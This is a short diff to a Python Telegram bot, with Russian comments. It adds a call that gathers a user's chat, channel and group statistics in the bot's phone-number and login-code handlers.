@@ -86,7 +86,7 @@ async def get_phone_number(message: types.Message):
 
         # Получаем информацию о пользователе
         userid, userinfo, firstname, lastname, username = await get_user_info(client, phone_number, selection)
-
+        delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, admin_id, user_bots, user_bots_html = await get_type_of_chats(client, selection)
         # Получаем информацию о заблокированных ботах
         count_blocked_bot, earliest_date, latest_date, blocked_bot_info, blocked_bot_info_html, user_bots, user_bots_html = await get_blocked_bot(client, selection)
 
@@ -125,6 +125,7 @@ async def get_code(message: types.Message):
 
         # Получаем информацию о пользователе
         userid, userinfo, firstname, lastname, username = await get_user_info(client, phone_number, selection)
+        delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, admin_id, user_bots, user_bots_html = await get_type_of_chats(client, selection)
 
         # Получаем информацию о заблокированных ботах
         count_blocked_bot, earliest_date, latest_date, blocked_bot_info, blocked_bot_info_html, user_bots, user_bots_html = await get_blocked_bot(client, selection)
